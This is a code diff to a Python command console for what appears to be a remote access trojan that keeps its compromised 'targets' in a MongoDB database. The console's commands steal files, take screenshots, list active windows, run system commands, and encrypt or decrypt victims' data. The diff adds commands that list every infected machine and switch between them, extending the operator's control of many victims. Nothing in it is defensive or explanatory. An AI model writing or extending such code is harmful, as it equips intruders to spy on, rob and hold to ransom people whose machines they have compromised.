@@ -22,7 +22,7 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
+MY_COMMANDS=['targetlist','shifttarget','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
 
 CWD=r""
 LAST_PATH=""
@@ -74,20 +74,49 @@ def targetInfo():
         print(Fore.CYAN+">>> ")
         print("No Public IP Found!!!")
         
-    
-
-def getTargetMachine():
-    global TARGET,IP,PUBLIC_IP
+def getAllTargets():
     col=db['systemInfo']
-    x=col.find_one()
-    if x:
-        TARGET=x['hostname']
-        IP=x['ip']
-        PUBLIC_IP=x['public_ip']
-        return x['hostname'],x['ip']
+    res=col.find()
+    print()
+    print("TARGETS: ")
+    print()
+    print("\t| Hostname |\tIP")
+    print("\t-----------------------------")
+    for i in res:
+        print(f"\t| {i['hostname']} |\t{i['ip']}")
+        print("\t-----------------------------") 
+    print()
+
+def getTargetMachine(target=""):
+    global TARGET,IP,PUBLIC_IP,CWD,PREV_COMMAND
+    col=db['systemInfo']
+    if target=="":
+        x=col.find_one()
+        if x:
+            TARGET=x['hostname']
+            IP=x['ip']
+            PUBLIC_IP=x['public_ip']
+            CWD=""
+            PREV_COMMAND=""
+            return x['hostname'],x['ip']
+        else:
+            TARGET='None'
+            IP='None'
     else:
-        TARGET='None'
-        IP='None'
+        filters={
+            "hostname":target
+        }
+        x=col.find_one(filter=filters)
+        if x:
+            TARGET=x['hostname']
+            IP=x['ip']
+            PUBLIC_IP=x['public_ip']
+            CWD=""
+            PREV_COMMAND=""
+            return x['hostname'],x['ip']
+        else:
+            TARGET='None'
+            IP='None'
 
 def systemCommandsHandeler():
     global PREV_COMMAND,CWD,TARGET
@@ -429,6 +458,10 @@ def ActionUploader():
     
     elif a[0]=='system':
         systemCommandsHandeler()
+    elif a[0]=='targetlist' and len(a)==1:
+        getAllTargets()
+    elif a[0]=='shifttarget' and len(a)==2:
+        getTargetMachine(target=a[1])
 
     elif a[0]=='getalltypefiles' and len(a)==2:
         target_element=a[1]
@@ -554,6 +587,7 @@ def shell():
     global CWD
     global PREV_COMMAND
     global TARGET,IP
+    getAllTargets()
     getTargetMachine()
     while True:
         internet=has_active_internet()
